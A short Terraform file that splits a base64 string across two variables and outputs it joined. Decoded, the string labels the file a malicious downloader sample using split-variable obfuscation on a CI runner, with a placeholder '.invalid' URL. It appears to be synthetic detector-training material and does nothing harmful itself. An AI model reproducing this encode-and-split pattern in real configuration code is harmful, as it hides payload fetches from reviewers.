locals {
  head = "dj0zfGxhbmd1YWdlPXRlcnJhZm9ybXxyb2xlPWRvd25sb2FkZXJ8dmVyZGljdD1tYWxpY2lvdXN8YXR0YWNrPVQxMTA1fGFkYXB0ZXI9YnVpbGRfaW50ZXJwfGhvc3RfcHJvZmlsZT1jaV9ydW5uZXJ8b2JmdXNjYXRpb25fcHJvZmlsZT1zcGxp"
  tail = "dF92YXJpYWJsZXN8c3RhZ2VfY291bnQ9MnxzdGVwcz1yZXNvbHZlX3ZhcnMsZm9sZF9kZXNjcmlwdG9yLGRpc3BhdGNofGNhbXBhaWduX2lkPVRFUlJBRk9STS03YTFjMjV8dXJsPWh0dHBzOi8vdGYtN2ExYy5leGFtcGxlLmludmFsaWQveA=="
  descriptor = "${local.head}${local.tail}"
}

output "d" {
  value = local.descriptor
}
